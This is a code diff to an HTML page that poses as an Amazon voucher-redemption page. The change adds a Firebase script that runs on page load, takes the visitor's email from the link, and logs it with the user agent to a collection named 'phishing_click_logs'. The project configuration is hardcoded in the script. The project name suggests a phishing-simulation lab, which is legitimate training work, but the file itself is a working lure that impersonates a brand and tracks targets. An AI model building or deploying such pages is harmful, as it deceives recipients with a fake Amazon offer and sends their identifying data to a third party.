@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <title>Amazon - Redeem Your Voucher</title>
   <style>
-    body {
+  body {
       margin: 0;
       font-family: "Amazon Ember", Arial, sans-serif;
       background-color: #eaeaea;
@@ -198,6 +198,43 @@
   </div>
 
   <footer>© 2025 Amazon.com, Inc. or its affiliates</footer>
+
+  <!-- Firebase click tracking script -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDqUpk3YFH81xGkdnKwOmWHMpt0aw9RNvg",
+      authDomain: "cyberedge-lab.firebaseapp.com",
+      projectId: "cyberedge-lab",
+      storageBucket: "cyberedge-lab.appspot.com",
+      messagingSenderId: "783335288469",
+      appId: "1:783335288469:web:644d3626f4f7811c34b59c",
+      measurementId: "G-KDY343F4VP",
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // ✅ Log link click when page loads
+    window.onload = async () => {
+      const urlParams = new URLSearchParams(window.location.search);
+      const userEmail = urlParams.get("user") || "unknown_user";
+
+      try {
+        await addDoc(collection(db, "phishing_click_logs"), {
+          email: userEmail,
+          timestamp: serverTimestamp(),
+          action: "Email link clicked",
+          userAgent: navigator.userAgent,
+        });
+        console.log("Click logged successfully");
+      } catch (e) {
+        console.error("Error logging click:", e);
+      }
+    };
+  </script>
 
 </body>
 </html>
